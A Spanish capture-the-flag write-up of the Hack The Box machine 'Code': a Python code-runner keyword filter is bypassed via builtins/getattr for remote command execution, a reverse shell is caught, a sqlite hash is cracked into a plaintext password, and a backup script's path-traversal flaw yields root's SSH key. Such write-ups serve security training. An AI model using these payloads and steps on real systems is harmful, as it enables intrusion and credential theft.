___
# Máquina Code (Hack The Box)

**IP atacante**: 10.10.17.184
**IP víctima**: 10.129.231.240

Comprobamos si tenemos conexión con la máquina

![[code_connect.png]]

Observamos que el ttl = 63, lo que quiere decir que es un máquina Linux

___
# 1. Renocimiento

Realizamos un escaneo con nmap para descubrir posibles puertos abiertos

```bash
nmap -p- --open -sS -T5 -n -Pn -vvv 10.129.231.240
```

![[code_nmap.png]]

Puertos abiertos:

- 22 - SSH - Versión: OpenSSH 8.2p1
- 5000 - HTTP - Gunicorn 20.0.4

Entramos a http://10.129.231.240:5000 para ver la web

![[code_web.png]]

De primeras nos muestra que es un ejecutor de código python, por lo que podemos probar a cambiar el id del usuario a 0 para convertirnos en root (0).

![[code_setuid.png]]

Nos dice que tiene palabras clave que no están permitidas, probando descubrimos que son: import, os y system.
Podemos hace un **bypass de sanitización de palabras clave** tratando de import la librería `os` usando el módulo `builtins` luego nos enviaremos un ping y nos pondremos en escucha por la interfaz `tun0` con tshark para ver si logramos RCE (ejecución remota de comandos).

```python
test = getattr(print.__self__,'__im'+'port__')('o'+'s')
getattr(test,'sys'+'tem')('ping -c 1 10.10.17.184')

# 1. print.__self__ devuelve el módulo 'builtins', ya que print vive dentro de él
# 2. Con getattr buscamos un atributo del módulo builtins
# 3. Se separa para pasar el filtro y Python evalúa la concatenación
# 4. Al no estar prohibido, se busca el atributo __import__ dentro del módulo 'builtins' | Devuelve la función real
# 5. Se agrega os (argumento) de la función import
# 6. Repetimos el mismo paso para realizar un ping a nuestra máquina
```

![[code_bypass.png]]

```bash
tshark -i tun0 2>/dev/null
```

![[code_tshark.png]]

Logramos RCE, asi que nos mandamos una reverse shell al puerto 443 que esta en escucha (netcat)

```bash
nc -nlvp 443
```

![[code_reverseshell.png]]

![[code_bash.png]]

Logramos obtener una bash, asi que aplicamos sanitzación de tty

```bash
script /dev/null -c bash
# Ctrl + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
```

Miramos la flag del usuario

![[code_flaguser.png]]


# 2. Enumeración

También podemos ver qué usuarios se encuentran en el sistema en ``/etc/passwd``, encontrando un usuario llamado `martin` y `app-production` (en el que estamos).

![[code_users.png]]

Revisando archivos, vemos uno llamado app.py que apunta hacia un archivo de base de datos (usa sqlite3)

![[code_py.png]]

Buscamos dónde está el archivo para ejecutarlo con el binario `sqlite3` y enumerar credenciales si las hay.

```bash
find . -name database.bd
sqlite3 database.bd
```

![[code_credhash.png]]

Encontramos la contraseña hasheado de martin, asi que usamos una herramienta en línea para descrifirarla: https://crackstation.net/

# 3. Explotación


![[code_crackhash.png]]

Credenciales:

- ``martin``:``nafeelswordsmaster``

Ingresamos por ssh a la máquina

```bash
ssh martin@10.129.231.240
```

![[code_sshcheck.png]]

Buscamos archivos, binarios, y métodos para las escalada de privilegios:

```bash
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
sudo -l
```

Con `sudo -l` podemos ver que el usuario ``martin`` puede ejecutar un binario llamado backy.sh, el contenido es el siguiente:

![[code_backysh.png|700]]

El script realiza un backup cogiendo la ruta de un archivo .json, además aplica sanitzación que evita un path traversal, pero esta no es recursiva, por lo que es explotable.

En el directorio `/home/martin/backups` podemos ver un ejemplo de .json con la ruta que tomará para hacerle un backup, asi que cambiamos el contenido para que haga un backup del directorio de root aplicando path traversal.

![[code_json.png]] 

El destino será el home del usuario `martin` y la ruta del backup partirá de ``/home/`` porque esta permitido partir de ahí y de `/var/`, asi que ejecutamos el binario

```bash
backy.sh task.json
```

![[code_flagroot.png]]

Obtenemos así la flag de root
# 4. Escalada de privilegios

Revisamos la clave privada de root en el directorio ``.ssh`` y nos conectamos por ssh especificando dicha clave

```bash
ssh -i id_rsa root@localhost
```

![[code_root.png]]

